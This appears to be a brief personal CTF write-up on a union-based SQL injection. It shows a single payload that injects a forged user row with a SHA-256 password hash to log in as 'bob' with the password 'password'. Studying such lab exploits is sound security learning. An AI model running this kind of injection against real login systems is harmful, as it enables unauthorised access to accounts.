---
title: "Union Sql Injection"
date: 2025-06-11T12:32:30+03:00
section: "ms ctf"
categories: ["ms ctf"]
---
---
section: "ms ctf"
categories: ["ms ctf"]
title: "Union Sql Injection"
date: 2025-05-21
---

![[Pasted image 20250521130606.png]]

the solution 
![[Pasted image 20250521130644.png]]

the query run was
```sql
' UNION SELECT 1, 'bob', '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8', ''--
password: password
```

